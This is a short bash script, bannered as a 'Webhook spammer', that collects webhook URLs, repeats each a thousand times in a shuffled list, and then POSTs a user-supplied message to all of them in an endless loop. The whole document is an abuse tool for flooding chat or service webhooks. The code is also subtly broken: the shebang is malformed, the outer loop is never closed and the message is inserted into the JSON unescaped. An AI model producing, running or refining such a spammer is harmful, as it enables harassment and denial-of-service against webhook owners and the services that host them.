!/usr/bin/bash

touch url_file.txt
touch webhooks.log
RED='\033[0;31m'
num_rep=1000

clear
printf "\n ${RED}     __                              "
printf "\n ${RED}    ___|  |                   |      "
printf "\n ${RED} | |      __ \    _ \    __|  __|    "
printf "\n ${RED} | |   |  | | |  (   | \__ \  |      "
printf "\n ${RED}  \__|_| _| |_| \___/  ____/ \__|.sh "
printf "\n ${RED} ________________________________    "
printf "\n ${RED}        [+] Webhook spammer.   "
printf "\n ${RED} ________________________________    "
echo 
echo 

until [[ $URL == "stop" ]]; do  #
echo -n "[!]Webhooks: " 
read URL  
echo "$URL" >>webhooks.log
sed -i -e "/stop/d" webhooks.log
[ $URL == "stop" ] && continue
for ((i = 1; i <= num_rep; i++)); do
   echo "$URL" >> url_file.txt
   shuf url_file.txt -o url_file.txt
   done
done

echo -n " [+] text: "
read cont

while true; do
while IFS= read -r line; do
  
curl  -H "Content-Type: application/json" \
      -X POST \
      -d "{\"content\": \"$cont\"}" \
      "$line"
 
done < url_file.txt
